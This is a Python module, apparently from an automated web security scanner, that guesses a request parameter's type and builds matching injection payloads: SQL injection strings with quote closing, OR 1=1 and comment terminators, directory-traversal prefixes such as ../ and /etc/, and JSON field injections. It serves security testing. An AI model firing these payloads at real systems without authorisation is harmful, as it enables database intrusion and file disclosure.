"""core/loops/context_generator.py — 上下文感知 payload 生成器（§3.12.1 (5)）。

根据参数值的类型（int / string / path / json_field / header）生成适配的 payload
变体，避免盲目发 payload 导致大量噪声。

零外部依赖（纯 stdlib）。
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Iterable

# 参数值类型推断阈值
_INT_MAX = 2**63 - 1


@dataclass
class PayloadVariant:
    """单个 payload 变体。"""
    payload: str
    context: str  # int / string / path / json / header
    note: str = ""


@dataclass
class ContextPayloads:
    """某参数的上下文 payload 集合。"""
    param_name: str
    value_type: str
    variants: list[PayloadVariant] = field(default_factory=list)


def detect_value_type(value: str) -> str:
    """推断参数值类型。

    Returns:
        'int' | 'float' | 'path' | 'json' | 'string'
    """
    if value is None:
        return "string"
    v = str(value).strip()
    if v == "":
        return "string"
    # 纯数字
    if v.lstrip("-").isdigit():
        return "int"
    # 浮点
    try:
        float(v)
        if "." in v or "e" in v.lower():
            return "float"
    except ValueError:
        pass
    # 路径（含 / 或 \）
    if "/" in v or "\\" in v:
        return "path"
    # JSON 结构
    if v.startswith("{") and v.endswith("}"):
        return "json"
    if v.startswith("[") and v.endswith("]"):
        return "json"
    return "string"


def generate_int_payloads(base_injection: str) -> list[PayloadVariant]:
    """整数型参数：数字前缀注入 + 算术表达式。"""
    return [
        PayloadVariant(f"1 AND {base_injection}", "int", "数字前缀"),
        PayloadVariant(f"1 OR {base_injection}", "int", "数字前缀 OR"),
        PayloadVariant(f"0-{base_injection}", "int", "减法嵌入"),
        PayloadVariant(f"1*0+{base_injection}", "int", "算术嵌入"),
    ]


def generate_string_payloads(base_injection: str) -> list[PayloadVariant]:
    """字符串型参数：引号闭合 + 注释。"""
    return [
        PayloadVariant(f"' OR '{base_injection}", "string", "单引号闭合"),
        PayloadVariant(f"\" OR \"{base_injection}", "string", "双引号闭合"),
        PayloadVariant(f"') OR ('{base_injection}", "string", "括号闭合"),
        PayloadVariant(f"';{base_injection};--", "string", "分号 + 注释"),
    ]


def generate_path_payloads(base_injection: str) -> list[PayloadVariant]:
    """路径型参数：目录遍历 + 注入。"""
    return [
        PayloadVariant(f"../{base_injection}", "path", "上跳目录"),
        PayloadVariant(f"./{base_injection}", "path", "当前目录"),
        PayloadVariant(f"/etc/{base_injection}", "path", "绝对路径"),
    ]


def generate_json_payloads(base_injection: str) -> list[PayloadVariant]:
    """JSON 型参数：字段值注入 + 结构破坏。"""
    return [
        PayloadVariant(f'{{"key":"{base_injection}"}}', "json", "JSON 字段值"),
        PayloadVariant(f'{{"key":{base_injection}}}', "json", "JSON 数字字段"),
        PayloadVariant(f'{{"key":"a","b":"{base_injection}"}}', "json", "JSON 多字段"),
    ]


def generate_payloads(param_name: str, value: str,
                      base_injection: str = "1=1") -> ContextPayloads:
    """根据参数值类型生成上下文感知 payload 集合。

    Args:
        param_name: 参数名
        value: 参数当前值
        base_injection: 基础注入串（默认 "1=1"）

    Returns:
        ContextPayloads
    """
    vtype = detect_value_type(value)
    generators = {
        "int": generate_int_payloads,
        "float": generate_int_payloads,  # 复用 int 变体
        "string": generate_string_payloads,
        "path": generate_path_payloads,
        "json": generate_json_payloads,
    }
    gen = generators.get(vtype, generate_string_payloads)
    variants = gen(base_injection)
    return ContextPayloads(param_name=param_name, value_type=vtype, variants=variants)


def generate_params_payloads(params: dict[str, str],
                             base_injection: str = "1=1") -> list[ContextPayloads]:
    """为多个参数生成上下文 payload 集合。"""
    return [generate_payloads(k, v, base_injection) for k, v in params.items()]


__all__ = [
    "PayloadVariant", "ContextPayloads",
    "detect_value_type", "generate_payloads", "generate_params_payloads",
    "generate_int_payloads", "generate_string_payloads",
    "generate_path_payloads", "generate_json_payloads",
]
